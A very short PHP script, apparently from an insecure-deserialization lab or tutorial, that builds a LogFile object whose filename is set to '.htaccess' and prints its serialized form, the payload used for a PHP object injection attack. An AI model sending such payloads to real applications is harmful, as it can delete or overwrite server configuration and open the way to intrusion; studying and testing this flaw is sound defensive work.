
<?php
 include('6.php');
$obj = new LogFile();
$obj->filename = '.htaccess';
 
echo serialize($obj) . '<br />';
 
?>